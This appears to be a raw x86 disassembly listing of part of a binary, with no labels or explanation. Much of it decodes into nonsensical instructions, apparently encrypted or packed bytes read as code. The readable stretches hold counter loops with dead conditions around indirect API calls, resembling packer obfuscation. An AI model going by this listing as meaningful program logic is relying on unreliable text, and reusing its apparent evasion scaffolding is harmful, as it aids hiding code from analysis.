  408c2b:	imul   eax,DWORD PTR [esi],0xe399a0d7
  408c31:	imul   esi,DWORD PTR [edi],0xffffff8a
  408c34:	lea    eax,[ebx]
  408c36:	daa    
  408c37:	inc    ecx
  408c38:	xchg   edx,eax
  408c39:	or     al,BYTE PTR [edx]
  408c3b:	in     ax,0x66
  408c3e:	sar    BYTE PTR [edi],1
  408c40:	or     al,0x21
  408c42:	sub    al,0xc3
  408c44:	push   esp
  408c45:	mov    dh,0xa7
  408c47:	in     al,dx
  408c48:	cld    
  408c49:	sub    edi,ecx
  408c4b:	jg     0x408c9f
  408c4d:	ret    0x4774
  408c50:	nop
  408c51:	int3   
  408c52:	and    eax,0xa3683467
  408c57:	dec    ebp
  408c58:	mov    ch,0xff
  408c5a:	shr    DWORD PTR [edi],1
  408c5c:	cmp    BYTE PTR [ecx],bl
  408c5e:	pop    edx
  408c5f:	mov    ds:0xcfce9f59,eax
  408c64:	les    edi,FWORD PTR [ebp-0x7c]
  408c67:	or     ebp,DWORD PTR [esi+0x666b9f91]
  408c6d:	jp     0x408c3c
  408c6f:	cmp    al,0xd5
  408c71:	sbb    al,0xeb
  408c73:	(bad)  
  408c74:	push   0xb
  408c76:	(bad)  
  408c77:	dec    ebp
  408c78:	daa    
  408c79:	fmul   st,st(2)
  408c7b:	loopne 0x408cea
  408c7d:	dec    ebp
  408c7e:	in     al,dx
  408c7f:	dec    ecx
  408c80:	pop    edx
  408c81:	sub    dl,al
  408c83:	ror    BYTE PTR [edx-0x2246e42c],0xf9
  408c8a:	popf   
  408c8b:	mov    ds:0x21060a09,al
  408c90:	add    edx,esi
  408c92:	imul   edx,edi
  408c95:	sub    DWORD PTR [eax],edx
  408c97:	mov    eax,DWORD PTR [ebp-0x14]
  408c9a:	jmp    0x408756
  408c9f:	mov    eax,DWORD PTR [ebp-0xc]
  408ca2:	mov    edx,DWORD PTR [ebp-0x18]
  408ca5:	jmp    0x408e2c
  408caa:	test   ecx,ebx
  408cac:	stc    
  408cad:	test   BYTE PTR [ecx+0x64],ah
  408cb0:	sbb    ecx,0x67327607
  408cb6:	rcl    bh,0x7a
  408cb9:	aaa    
  408cba:	adc    al,0xdc
  408cbc:	jle    0x408d3c
  408cbe:	in     al,0x7f
  408cc0:	jle    0x408d40
  408cc2:	shl    BYTE PTR [ebp+0x8f99537],1
  408cc8:	fnstcw WORD PTR [edi+ebp*4-0x182a9c0c]
  408ccf:	jne    0x408ce1
  408cd1:	pop    ebx
  408cd2:	xor    BYTE PTR [ecx],dl
  408cd4:	mov    al,ds:0x4e00b4ea
  408cd9:	mov    cl,0xb1
  408cdb:	bound  esi,QWORD PTR [esi+0x2b5190f1]
  408ce1:	xlat   BYTE PTR ds:[ebx]
  408ce2:	popf   
  408ce3:	jle    0x408d3c
  408ce5:	aad    0x1a
  408ce7:	mov    bl,0x34
  408ce9:	cmp    eax,ebx
  408ceb:	fstp   TBYTE PTR [ebp-0x2d5ae866]
  408cf1:	std    
  408cf2:	mov    dh,BYTE PTR [ebp-0xc]
  408cf5:	xchg   esp,edx
  408cf7:	dec    eax
  408cf8:	xor    BYTE PTR [esi-0x5c],cl
  408cfb:	int3   
  408cfc:	adc    al,0x1b
  408cfe:	xor    DWORD PTR [esi],0x7050f689
  408d04:	shl    edx,0x71
  408d07:	mov    esi,DWORD PTR [eax]
  408d09:	sbb    al,0x9d
  408d0b:	xor    eax,0xe9620c6b
  408d10:	inc    ebp
  408d11:	stos   BYTE PTR es:[edi],al
  408d12:	jmp    0x6449:0xfc250ba5
  408d19:	sbb    DWORD PTR [edx+0x3e0d2850],eax
  408d1f:	in     eax,0x4e
  408d21:	mov    esi,0xec263b43
  408d26:	or     eax,0x8fbcc2be
  408d2b:	outs   dx,DWORD PTR ds:[esi]
  408d2c:	mov    ds:0xabfc6309,al
  408d31:	sbb    ebx,DWORD PTR [esi]
  408d33:	(bad)  
  408d34:	pop    esi
  408d35:	or     DWORD PTR [esi],ebp
  408d37:	fcom   QWORD PTR [esi+0x257b4705]
  408d3d:	push   si
  408d3f:	loop   0x408d95
  408d41:	dec    esi
  408d42:	push   ds
  408d43:	sbb    al,0x61
  408d45:	mov    dh,0xd
  408d47:	loope  0x408cee
  408d49:	int    0x96
  408d4b:	fist   WORD PTR [edx-0x4d]
  408d4e:	mov    ds:0xc0a8f58,al
  408d53:	push   ds
  408d54:	in     eax,dx
  408d55:	btr    DWORD PTR [ecx-0x30b588c3],ebp
  408d5c:	je     0x408d1a
  408d5e:	add    DWORD PTR [esi+ecx*8],ecx
  408d61:	retf   
  408d62:	add    eax,0xe87b7ee9
  408d67:	dec    edi
  408d68:	sub    eax,esi
  408d6a:	mov    ds:0x9418a07b,al
  408d6f:	test   al,0x6
  408d71:	inc    esi
  408d72:	cmp    DWORD PTR [edi+0x2],esp
  408d75:	in     al,0x1e
  408d77:	cli    
  408d78:	hlt    
  408d79:	cdq    
  408d7a:	fnstsw WORD PTR [ebp+0x4cd3ad68]
  408d80:	and    al,0x4f
  408d82:	mov    dh,0xf5
  408d84:	xchg   BYTE PTR ds:[ecx+eax*2-0x5bb13206],cl
  408d8c:	cdq    
  408d8d:	sbb    DWORD PTR ss:[esi+0x7a],0x110271c4
  408d95:	fsub   QWORD PTR [eax+0x5d]
  408d98:	pop    esi
  408d99:	jl     0x408d28
  408d9b:	jmp    0xb395b82b
  408da0:	xlat   BYTE PTR ds:[ebx]
  408da1:	loop   0x408e15
  408da3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408da4:	pop    ss
  408da5:	cmp    cl,BYTE PTR [ebx-0x8]
  408da8:	jmp    0xbc8ba345
  408dad:	jb     0x408d74
  408daf:	mov    ds:0xcf920a2,eax
  408db4:	add    eax,0xba1f6f48
  408db9:	adc    al,BYTE PTR [ebx-0x6023a149]
  408dbf:	inc    eax
  408dc0:	stc    
  408dc1:	xor    esi,0x94ece9cc
  408dc7:	xor    eax,0x9b6c0763
  408dcc:	pop    ds
  408dcd:	mov    edi,ecx
  408dcf:	stc    
  408dd0:	sbb    BYTE PTR [esi+ebx*4-0x275a1f28],bl
  408dd7:	mov    bl,0xb
  408dd9:	mov    dl,0xfd
  408ddb:	add    esi,DWORD PTR ss:[eax]
  408dde:	loop   0x408df2
  408de0:	lds    esi,FWORD PTR [esi-0x6d58a30c]
  408de6:	into   
  408de7:	scas   al,BYTE PTR es:[edi]
  408de8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408de9:	in     al,0x8f
  408deb:	inc    esp
  408dec:	mov    esp,0x18f90afe
  408df1:	jno    0x408e22
  408df3:	comiss xmm4,xmm2
  408df6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408df7:	bound  esp,QWORD PTR [edx]
  408df9:	in     eax,dx
  408dfa:	sbb    ch,BYTE PTR [eax+0x68]
  408dfd:	mov    eax,0xea9f3cfd
  408e02:	inc    esp
  408e03:	xlat   BYTE PTR ds:[ebx]
  408e04:	shl    dh,0x2b
  408e07:	push   0xffffffb0
  408e09:	jge    0x408dc6
  408e0b:	call   0xc00cf491
  408e10:	pop    ecx
  408e11:	mov    eax,cs
  408e13:	lods   al,BYTE PTR ds:[esi]
  408e14:	or     DWORD PTR [esi+0x4cf05607],edi
  408e1a:	ror    BYTE PTR [ebp-0x3e4dc6e0],1
  408e20:	stc    
  408e21:	daa    
  408e22:	mov    dh,0xf9
  408e24:	adc    DWORD PTR [ecx+0x38],0xffffff9b
  408e28:	pushf  
  408e29:	sub    al,0xc1
  408e2b:	stc    
  408e2c:	xor    eax,edx
  408e2e:	cmp    eax,0x7aa80c5b
  408e33:	je     0x40858a
  408e39:	mov    eax,DWORD PTR [ebp-0x10]
  408e3c:	add    DWORD PTR [eax],0x7403501
  408e42:	jmp    0x40858a
  408e47:	mov    eax,DWORD PTR [ebp-0x1c]
  408e4a:	jmp    0x408fd1
  408e4f:	xor    eax,0xa417048d
  408e54:	xchg   edi,eax
  408e55:	xor    eax,0xaa1dcad
  408e5a:	jmp    0xe9dc5fd3
  408e5f:	cli    
  408e60:	fnstsw WORD PTR [esi+0x7e]
  408e63:	in     al,0x7f
  408e65:	jle    0x408ee5
  408e67:	bound  edi,QWORD PTR [ebp-0x437c1d38]
  408e6d:	aam    0x51
  408e6f:	pop    ecx
  408e70:	fsub   DWORD PTR [ebp+edx*4+0x7c]
  408e74:	mov    bh,0xfb
  408e76:	popf   
  408e77:	rep stos BYTE PTR es:[edi],al
  408e79:	lahf   
  408e7a:	mov    esp,0xe958164a
  408e7f:	lldt   WORD PTR [esi]
  408e82:	retf   0xcd3
  408e85:	jmp    0x408ecc
  408e87:	mov    edx,0x33560412
  408e8c:	ror    bh,0x29
  408e8f:	push   eax
  408e90:	gs lock dec edi
  408e93:	call   0x20d6:0x4345ecef
  408e9a:	(bad)  
  408e9b:	cmp    al,0xcb
  408e9d:	sti    
  408e9e:	mov    dh,0x8f
  408ea0:	inc    ebp
  408ea1:	js     0x408e7f
  408ea3:	xchg   esi,eax
  408ea4:	and    eax,0xb843a6be
  408ea9:	or     al,BYTE PTR [eax-0x46]
  408eac:	(bad)  
  408eae:	sbb    cl,dh
  408eb0:	pop    esp
  408eb1:	or     ebp,edx
  408eb3:	inc    esi
  408eb4:	adc    eax,0x150da743
  408eb9:	loopne 0x408e8f
  408ebb:	jl     0x408e5b
  408ebd:	jb     0x408ebf
  408ebf:	adc    bl,cl
  408ec1:	cli    
  408ec2:	(bad)  
  408ec3:	in     al,dx
  408ec4:	xchg   al,al
  408ec6:	xchg   edx,eax
  408ec7:	mov    edi,0x35c9164b
  408ecc:	cs call 0x781c:0xdd678f3
  408ed4:	jb     0x408f19
  408ed6:	nop
  408ed7:	sub    DWORD PTR [edx],eax
  408ed9:	ret    
  408eda:	adc    al,0x3f
  408edc:	cmp    BYTE PTR [ebp+0x4d],bh
  408edf:	sbb    DWORD PTR [ebx-0x40],ebx
  408ee2:	or     bh,0x34
  408ee5:	shl    DWORD PTR [esi+0x54],cl
  408ee8:	ret    
  408ee9:	dec    ecx
  408eea:	data16 mov al,0xf6
  408eed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408eee:	jo     0x408edb
  408ef0:	pop    ds
  408ef1:	mov    cs,ecx
  408ef3:	mov    dh,0xf9
  408ef5:	pop    ebx
  408ef6:	(bad)  
  408ef7:	jmp    0x408ebe
  408ef9:	aam    0xf6
  408efb:	jmp    0x340a:0x425f4ff4
  408f02:	push   ds
  408f03:	das    
  408f04:	dec    ebx
  408f05:	xlat   BYTE PTR ds:[ebx]
  408f06:	jmp    0x37cc:0xa2598a94
  408f0d:	push   ss
  408f0e:	addr16 cwde 
  408f10:	xor    DWORD PTR [ebp+0x273a1ee9],eax
  408f16:	mov    eax,0xc7552190
  408f1b:	aas    
  408f1c:	(bad)  
  408f1d:	sub    DWORD PTR [edx],edx
  408f1f:	dec    ebx
  408f20:	mov    edx,0xb37fe15b
  408f25:	(bad)  [edx]
  408f27:	and    bl,BYTE PTR [ecx-0x51]
  408f2a:	pop    ss
  408f2b:	rol    BYTE PTR [ecx+0x50b2d545],1
  408f31:	xchg   ecx,eax
  408f32:	icebp  
  408f33:	fisub  DWORD PTR [edx]
  408f35:	mov    ah,0xd7
  408f37:	jne    0x408fa2
  408f39:	dec    ebp
  408f3a:	popa   
  408f3b:	dec    edi
  408f3c:	xchg   ebx,eax
  408f3d:	sub    BYTE PTR [esi-0x52],dl
  408f40:	int3   
  408f41:	inc    edi
  408f42:	hlt    
  408f43:	xor    BYTE PTR [esi],dh
  408f45:	mov    cl,0x11
  408f47:	clc    
  408f48:	inc    esi
  408f49:	add    ebx,DWORD PTR [ecx]
  408f4b:	sbb    ah,bl
  408f4d:	ins    BYTE PTR es:[edi],dx
  408f4e:	inc    ebx
  408f4f:	nop
  408f50:	sbb    bl,bl
  408f52:	lods   al,BYTE PTR ds:[esi]
  408f53:	arpl   WORD PTR [eax+edi*4+0x6cf33b68],di
  408f5a:	cmp    edx,eax
  408f5c:	pop    edx
  408f5d:	jmp    0x408f6a
  408f5f:	in     al,0x64
  408f61:	pop    ecx
  408f62:	sbb    eax,0x9c983fdf
  408f67:	shl    DWORD PTR ds:0xa3c8d2da,cl
  408f6d:	mov    ebp,0xa7f2947a
  408f72:	and    BYTE PTR [ecx+0x11],cl
  408f75:	outs   dx,DWORD PTR ds:[esi]
  408f76:	and    al,0x88
  408f78:	iret   
  408f79:	mov    eax,ds:0x918605a1
  408f7e:	repz mov WORD PTR [ebx],gs
  408f81:	addr16 mov esi,0xd6544901
  408f87:	aas    
  408f88:	sbb    bh,bl
  408f8a:	xchg   esi,eax
  408f8b:	test   al,0x71
  408f8d:	aas    
  408f8e:	adc    eax,0xc078464b
  408f93:	loop   0x408f30
  408f95:	pusha  
  408f96:	scas   eax,DWORD PTR es:[edi]
  408f97:	mov    dl,BYTE PTR [edi*4+0x7163d267]
  408f9e:	push   edx
  408f9f:	pop    esi
  408fa0:	in     eax,0x54
  408fa2:	(bad)  
  408fa3:	sub    ah,BYTE PTR [ebx-0x9]
  408fa6:	dec    esi
  408fa7:	imul   ecx,ebx,0xffffffaa
  408faa:	cmp    ebp,edi
  408fac:	popa   
  408fad:	or     ah,BYTE PTR [esi]
  408faf:	ins    DWORD PTR es:[edi],dx
  408fb0:	sub    edi,eax
  408fb2:	add    ebx,DWORD PTR [eax-0x41c75822]
  408fb8:	enter  0x9f8f,0xae
  408fbc:	and    BYTE PTR [eax-0x22],al
  408fbf:	stos   BYTE PTR es:[edi],al
  408fc0:	add    edi,DWORD PTR [edx+0x1a]
  408fc3:	jns    0x408f4b
  408fc5:	pop    ebp
  408fc6:	or     eax,0x9381db19
  408fcb:	retf   
  408fcc:	push   cs
  408fcd:	cmp    eax,0x39e17b19
  408fd2:	cmp    BYTE PTR [edi],cl
  408fd4:	test   BYTE PTR [ecx-0x4700000b],dh
  408fda:	call   0xf8fe:0xe9800f1c
  408fe1:	(bad)  
  408fe2:	call   DWORD PTR [ebp-0x75]
  408fe5:	in     al,dx
  408fe6:	sub    esp,0x20
  408fe9:	sub    ecx,eax
  408feb:	mov    eax,ds:0x413bde
  408ff0:	and    DWORD PTR ds:0x4337af,0x0
  408ffa:	jmp    0x40900c
  408fff:	mov    ecx,DWORD PTR ds:0x4337af
  409005:	inc    ecx
  409006:	mov    DWORD PTR ds:0x4337af,ecx
  40900c:	cmp    DWORD PTR ds:0x4337af,0x1c
  409013:	jae    0x409040
  409019:	cmp    DWORD PTR ds:0x4337af,0x20
  409020:	jne    0x40903b
  409026:	push   0x4819
  40902b:	push   0x30ae
  409030:	push   0x3675
  409035:	call   DWORD PTR ds:0x412014
  40903b:	jmp    0x408fff
  409040:	mov    eax,DWORD PTR [eax+0x198]
  409046:	mov    DWORD PTR [ebp-0x8],eax
  409049:	and    DWORD PTR ds:0x4337eb,0x0
  409053:	mov    ecx,DWORD PTR ds:0x4337eb
  409059:	inc    ecx
  40905a:	mov    DWORD PTR ds:0x4337eb,ecx
  409060:	cmp    DWORD PTR ds:0x4337eb,0x1c
  409067:	jne    0x409085
  40906d:	push   0x43382f
  409072:	push   0x494f
  409077:	push   0x43389a
  40907c:	push   DWORD PTR [ebp-0x24]
  40907f:	call   DWORD PTR ds:0x412394
  409085:	cmp    DWORD PTR ds:0x4337eb,0x13
  40908c:	jb     0x409053
  409092:	mov    eax,DWORD PTR [ebp+0x8]
  409095:	and    ecx,DWORD PTR ds:0x4337f3
  40909b:	mov    ecx,DWORD PTR [ebp-0x8]
  40909e:	sbb    DWORD PTR ds:0x433803,0x43383b
  4090a8:	push   ebx
  4090a9:	xor    DWORD PTR ds:0x433777,0x7c2a
  4090b3:	push   esi
  4090b4:	mov    esi,DWORD PTR ds:0x4337c7
  4090ba:	mov    ebx,DWORD PTR ds:0x4337db
  4090c0:	sub    ebx,esi
  4090c2:	or     esi,DWORD PTR [esi+ebx*1]
  4090c5:	mov    esi,0x7510854
  4090ca:	xor    eax,esi
  4090cc:	adc    DWORD PTR ds:0x4337a7,0x43372f
  4090d6:	push   edi
  4090d7:	mov    edi,0x32729b
  4090dc:	and    ebx,DWORD PTR ds:0x433727
  4090e2:	add    eax,edi
  4090e4:	mov    DWORD PTR [ecx],eax
  4090e6:	or     DWORD PTR ds:0x43383b,ebx
  4090ec:	lea    eax,[ebp-0x4]
  4090ef:	mov    DWORD PTR [ebp-0x10],eax
  4090f2:	mov    eax,DWORD PTR [ebp+0x8]
  4090f5:	mov    ecx,DWORD PTR [ebp-0x10]
  4090f8:	xor    eax,esi
  4090fa:	sbb    ebx,0x3e7b
  409100:	add    eax,edi
  409102:	mov    DWORD PTR ds:0x433713,0x17
  40910c:	cmp    DWORD PTR ds:0x433713,0x0
  409113:	je     0x40914b
  409119:	cmp    DWORD PTR ds:0x433713,0x27
  409120:	jne    0x409139
  409126:	push   0x3901
  40912b:	push   0x70c3
  409130:	push   DWORD PTR [ebp-0x1c]
  409133:	call   DWORD PTR ds:0x412398
  409139:	mov    ebx,DWORD PTR ds:0x433713
  40913f:	dec    ebx
  409140:	mov    DWORD PTR ds:0x433713,ebx
  409146:	jmp    0x40910c
  40914b:	mov    DWORD PTR [ecx],eax
  40914d:	neg    DWORD PTR ds:0x4337a7
  409153:	jmp    0x409474
  409158:	add    eax,0x73dd76a0
  40915d:	jmp    0x619bf1f7
  409162:	mov    ch,0x2
  409164:	sbb    al,dl
  409166:	cld    
  409167:	adc    esp,DWORD PTR [eax-0x26]
  40916a:	jle    0x4091ea
  40916c:	jp     0x4091eb
  40916e:	jle    0x4091ee
  409170:	cmp    al,0x24
  409172:	test   al,0x8b
  409174:	xchg   BYTE PTR [edi],dh
  409176:	(bad)  
  409177:	jno    0x409149
  409179:	sbb    dh,BYTE PTR [ebp-0x21]
  40917c:	pusha  
  40917d:	jmp    0xc528:0x2c879711
  409184:	fcmove st,st(0)
  409186:	add    esi,DWORD PTR [edx+0x6185fd34]
  40918c:	shr    cl,1
  40918e:	fxch   st(1)
  409190:	push   ecx
  409191:	jb     0x409181
  409193:	inc    edx
  409194:	mov    ds:0x323977b6,al
  409199:	push   edx
  40919a:	jge    0x4091f8
  40919c:	loopne 0x4091f8
  40919e:	out    0xab,al
  4091a0:	sbb    al,0x69
  4091a2:	and    al,0xae
  4091a4:	pushf  
  4091a5:	mov    eax,0xc7c7e610
  4091aa:	outs   dx,BYTE PTR ds:[esi]
  4091ab:	call   0x6d9e33ff
  4091b0:	or     eax,0x216d77a5
  4091b5:	inc    ebx
  4091b6:	cmc    
  4091b7:	or     DWORD PTR ss:[eax-0x39],edx
  4091bb:	stos   BYTE PTR es:[edi],al
  4091bc:	mov    ebp,DWORD PTR [edi]
  4091be:	or     eax,0x576e8c56
  4091c3:	inc    ebp
  4091c4:	sti    
  4091c5:	xchg   ebp,eax
  4091c6:	adc    al,0x25
  4091c8:	stos   BYTE PTR es:[edi],al
  4091c9:	xor    BYTE PTR [ecx+0x4],al
  4091cc:	sub    DWORD PTR [edx],ebp
  4091ce:	ror    BYTE PTR [eax],cl
  4091d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4091d1:	dec    edi
  4091d2:	in     eax,0x80
  4091d4:	xor    edi,DWORD PTR [ebx]
  4091d6:	sub    ah,BYTE PTR [ebp+0x3f105a91]
  4091dc:	iret   
  4091dd:	iret   
  4091de:	xor    eax,0x2d450772
  4091e3:	imul   esp,DWORD PTR ss:[esi],0x1ec7a1
  4091ea:	mov    al,0x3b
  4091ec:	addr16 stc 
  4091ee:	es ja  0x4091f3
  4091f1:	imul   edi,DWORD PTR [ebp-0x80],0x1d
  4091f5:	outs   dx,DWORD PTR ds:[esi]
  4091f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4091f7:	inc    esi
  4091f8:	stc    
  4091f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4091fa:	retf   0x1538
  4091fd:	sar    BYTE PTR [ebx],cl
  4091ff:	js     0x4091ae
  409201:	pushf  
  409202:	mov    edi,0xa9d1b75c
  409207:	xchg   ebp,eax
  409208:	cmp    dh,BYTE PTR [eax-0x6c5169de]
  40920e:	xchg   edi,eax
  40920f:	inc    esi
  409210:	outs   dx,DWORD PTR ds:[esi]
  409211:	repnz pop esi
  409213:	push   0x61b5eb8
  409218:	dec    ecx
  409219:	fisttp QWORD PTR [ecx+0x2e5babc7]
  40921f:	inc    eax
  409220:	fcomp  DWORD PTR [ebp+0x392ca64c]
  409226:	test   eax,0x9b102aa2
  40922b:	push   edx
  40922c:	xor    esi,eax
  40922e:	jle    0x4091c6
  409230:	xor    al,0xd9
  409232:	cmp    BYTE PTR [esi-0x2a5865fe],ch
  409238:	sub    BYTE PTR [ecx+ebp*2-0x24],ch
  40923c:	aam    0x9c
  40923e:	out    0x7a,eax
  409240:	rcl    al,0xfe
  409243:	adc    al,ah
  409245:	push   ds
  409246:	and    al,0xd8
  409248:	cdq    
  409249:	inc    edi
  40924a:	mov    eax,ds:0xc2d431aa
  40924f:	hlt    
  409250:	xor    ch,BYTE PTR [ecx]
  409252:	push   ds
  409253:	fisttp WORD PTR [eax]
  409255:	pop    edx
  409256:	imul   esp,DWORD PTR [esi-0x53b9b3a1],0x8d0c78dc
  409260:	xchg   BYTE PTR [edx],ch
  409262:	cli    
  409263:	adc    ch,BYTE PTR [esi]
  409265:	rcl    bh,1
  409267:	sbb    ecx,DWORD PTR [ecx-0x5eff2e5a]
  40926d:	jae    0x409234
  40926f:	in     al,0x29
  409271:	xor    ebx,DWORD PTR [eax-0x72]
  409274:	xor    eax,0x578185ee
  409279:	sub    DWORD PTR [ebp-0x41a9d34b],edx
  40927f:	cmc    
  409280:	icebp  
  409281:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409282:	ss popa 
  409284:	and    DWORD PTR [ecx+0xf],ebp
  409287:	inc    esp
  409288:	mov    edi,0x583c690b
  40928d:	sbb    edi,DWORD PTR [edx-0x72bc9137]
  409293:	daa    
  409294:	xchg   esi,eax
  409295:	adc    eax,DWORD PTR [edi-0x50]
  409298:	imul   esi,DWORD PTR [edx-0x48],0x1edc1f1b
  40929f:	aas    
  4092a0:	xor    DWORD PTR [ebx+0x12cbea70],ebp
  4092a6:	push   ebx
  4092a7:	icebp  
  4092a8:	inc    ecx
  4092a9:	loop   0x4092d4
  4092ab:	retf   0xef24
  4092ae:	mov    al,0xb2
  4092b0:	js     0x409328
  4092b2:	shl    DWORD PTR [edx+0x25c98ddf],cl
  4092b8:	in     eax,dx
  4092b9:	add    eax,0x4989b780
  4092be:	out    0x51,al
  4092c0:	cmp    cl,dh
  4092c2:	fmul   st,st(5)
  4092c4:	xor    al,0x68
  4092c6:	sub    ecx,DWORD PTR [edx]
  4092c8:	(bad)  
  4092c9:	aad    0x82
  4092cb:	ret    
  4092cc:	sbb    BYTE PTR [edx],bh
  4092ce:	mov    ecx,0x14589fbd
  4092d3:	add    BYTE PTR [edi+0x69],ch
  4092d6:	das    
  4092d7:	loope  0x4092af
  4092d9:	jns    0x40930b
  4092db:	scas   eax,DWORD PTR es:[edi]
  4092dc:	cmc    
  4092dd:	pop    ebx
  4092de:	imul   ecx,ebx,0xaed8f0a4
  4092e4:	lahf   
  4092e5:	outs   dx,DWORD PTR ds:[esi]
  4092e6:	xlat   BYTE PTR ds:[ebx]
  4092e7:	adc    BYTE PTR [eax-0x297cb718],ah
  4092ed:	les    ebp,FWORD PTR [eax-0x77068f61]
  4092f3:	ficom  DWORD PTR [esp+edi*1+0x46]
  4092f7:	fsubr  QWORD PTR [edi-0x4c]
  4092fa:	mov    bl,ah
  4092fc:	and    BYTE PTR [eax],bh
  4092fe:	fcomi  st,st(4)
  409300:	jb     0x409341
  409302:	adc    al,BYTE PTR [eax+edx*4]
  409305:	pop    edx
  409306:	mov    ds:0x3c9b5985,al
  40930b:	int3   
  40930c:	ret    
  40930d:	jge    0x40930e
  40930f:	mov    dh,0xa
  409311:	and    eax,0x56cf20aa
  409316:	cmc    
  409317:	sbb    al,0x9a
  409319:	(bad)  
  40931a:	sbb    esi,DWORD PTR [ecx+edx*2+0x64]
  40931e:	xchg   DWORD PTR ds:0x5b86be95,esi
  409324:	sbb    al,0x4e
  409326:	adc    al,0xfa
  409328:	and    al,bl
  40932a:	addr16 loopne 0x4092bd
  40932d:	sti    
  40932e:	ror    bh,0x1a
  409331:	daa    
  409332:	rol    DWORD PTR [eax-0x72a383a1],0xb4
  409339:	add    edx,DWORD PTR [edi+0x6224e35]
  40933f:	xor    DWORD PTR [ebx],0x8a9370ca
  409345:	dec    ebx
  409346:	push   ss
  409347:	or     esp,DWORD PTR [edi]
  409349:	sub    BYTE PTR [esi+esi*1+0x42],ch
  40934d:	test   eax,0x859efe9f
  409352:	ds mov edx,0x73918db
  409358:	sbb    esp,ecx
  40935a:	mov    edx,0x8a9928bf
  40935f:	repz jg 0x40938a
  409362:	mov    ebx,0xc28f625b
  409367:	and    eax,0xbf16c457
  40936c:	dec    ebx
  40936d:	rol    dh,1
  40936f:	in     al,dx
  409370:	xor    al,0x3a
  409372:	call   0xfee:0xeee7422e
  409379:	mov    cl,0x3
  40937b:	sbb    bh,BYTE PTR [ebx]
  40937d:	pop    ss
  40937e:	push   ecx
  40937f:	add    eax,0xfc4af743
  409384:	jl     0x409316
  409386:	std    
  409387:	lods   eax,DWORD PTR ds:[esi]
  409388:	pop    es
  409389:	addr16 ja 0x4093fe
  40938c:	mov    esp,0x1f02ee06
  409391:	stc    
  409392:	xchg   esi,eax
  409393:	push   esi
  409394:	xchg   ebp,eax
  409395:	xchg   ecx,eax
  409396:	mov    ebx,0x2c0d9c88
  40939b:	jae    0x4093b9
  40939d:	inc    edi
  40939e:	ret    
  40939f:	or     al,BYTE PTR [esp+ecx*4]
  4093a2:	cld    
  4093a3:	push   ebp
  4093a4:	lock sbb ebx,eax
  4093a7:	or     edi,esp
  4093a9:	in     eax,0x3f
  4093ab:	mov    esp,0x24e27b21
  4093b0:	cmp    eax,0xbc9f721f
  4093b5:	aad    0x94
  4093b7:	into   
  4093b8:	dec    eax
  4093b9:	in     al,0x13
  4093bb:	rcr    BYTE PTR [eax-0x2f793832],1
  4093c1:	sbb    bl,0xcb
  4093c4:	add    al,0x16
  4093c6:	cmc    
  4093c7:	push   es
  4093c8:	dec    esi
  4093c9:	xchg   edi,eax
  4093ca:	mov    esi,ebp
  4093cc:	mov    esp,0x4c805d56
  4093d1:	or     ebp,DWORD PTR [edx+0x2e33e4d9]
  4093d7:	das    
  4093d8:	mov    al,ds:0x34db8850
  4093dd:	pop    ds
  4093de:	cmp    ah,BYTE PTR [ebp-0x271df97e]
  4093e4:	cli    
  4093e5:	outs   dx,DWORD PTR ds:[esi]
  4093e6:	dec    ebp
  4093e7:	test   bh,ch
  4093e9:	adc    al,0x6b
  4093eb:	jne    0x40942c
  4093ed:	jle    0x409396
  4093ef:	aaa    
  4093f0:	sub    cl,BYTE PTR [ebx+0xbb2904e]
  4093f6:	nop
  4093f7:	fucomip st,st(2)
  4093f9:	pop    es
  4093fa:	std    
  4093fb:	jle    0x40941e
  4093fd:	pop    edi
  4093fe:	cs push edi
  409400:	arpl   WORD PTR ds:0x6d8f04c1,bp
  409406:	and    eax,0x29185c8a
  40940b:	or     BYTE PTR [esi+esi*1],0x20
  40940f:	push   ds
  409410:	test   eax,0xbf6deaa6
  409415:	xchg   edx,eax
  409416:	dec    esp
  409417:	and    DWORD PTR [esi],eax
  409419:	ficomp DWORD PTR [edi-0x56]
  40941c:	inc    eax
  40941d:	adc    BYTE PTR [edi-0x6bdce6f0],0x3b
  409424:	loopne 0x409427
  409426:	or     al,0x58
  409428:	jp     0x40943b
  40942a:	adc    dl,BYTE PTR [esi-0x4d]
  40942d:	aam    0xa4
  40942f:	jae    0x40942a
  409431:	inc    esi
  409432:	imul   esp,DWORD PTR ss:[eax+eiz*2-0x75],0x16337229
  40943b:	jb     0x409416
  40943d:	mov    ebx,DWORD PTR fs:[eax-0x6f232064]
  409444:	test   eax,esi
  409446:	fwait
  409447:	test   al,0xba
  409449:	data16 mov WORD PTR [eax+0x19c2f726],fs
  409450:	or     eax,DWORD PTR [ecx-0xc8613aa]
  409456:	pop    esp
  409457:	add    DWORD PTR [eax+0x4d],esp
  40945a:	addr16 sub al,0x14
  40945d:	repz push esp
  40945f:	sbb    BYTE PTR [edx],bh
  409461:	push   es
  409462:	jae    0x4093eb
  409464:	retf   0xd932
  409467:	add    eax,0x2cd78593
  40946c:	jp     0x40940f
  40946e:	sub    al,0xd4
  409470:	mov    ecx,DWORD PTR [eax]
  409472:	data16 sahf 
  409474:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  40947b:	and    DWORD PTR ds:0x43382b,0x0
  409485:	xor    ecx,ecx
  409487:	add    ecx,DWORD PTR ds:0x43382b
  40948d:	inc    ecx
  40948e:	mov    DWORD PTR ds:0x43382b,ecx
  409494:	cmp    DWORD PTR ds:0x43382b,0x23
  40949b:	jne    0x4094bf
  4094a1:	push   0x7f04
  4094a6:	push   DWORD PTR [ebp-0xc]
  4094a9:	push   DWORD PTR [ebp-0x28]
  4094ac:	push   0x10bc
  4094b1:	push   DWORD PTR [ebp-0x10]
  4094b4:	push   0x1509
  4094b9:	call   DWORD PTR ds:0x41239c
  4094bf:	cmp    DWORD PTR ds:0x43382b,0x13
  4094c6:	jb     0x409485
  4094cc:	sub    DWORD PTR ds:0x433713,ecx
  4094d2:	lea    eax,[ebp-0x14]
  4094d5:	and    DWORD PTR ds:0x433777,0x0
  4094df:	jmp    0x4094f1
  4094e4:	mov    ebx,DWORD PTR ds:0x433777
  4094ea:	inc    ebx
  4094eb:	mov    DWORD PTR ds:0x433777,ebx
